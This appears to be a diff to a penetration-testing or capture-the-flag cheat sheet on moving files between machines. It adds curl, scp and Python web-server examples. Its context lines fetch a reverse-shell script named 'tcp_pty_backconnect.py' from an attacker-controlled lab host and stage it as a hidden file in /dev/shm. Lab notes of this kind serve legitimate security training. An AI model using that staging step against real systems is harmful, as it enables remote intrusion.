@@ -22,12 +22,28 @@ wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 ```
 
-
-## 3.scp usages:
+## 3.Curl
 
 ```
-scp example@target-ip:/home/mohame/flag.txt ~/home               to downlaod files from machiens.
+curl -O http://192.168.0.101/file.txt
 ```
+
+## 4.scp usages:
+
+```
+# Copy a file:
+scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext
+
+# Copy a directory:
+scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination
+```
+
+## 5.Set Up a Simple Python Webserver
+
+```
+python -m SimpleHTTPServer 9999
+```
+
 
 
 
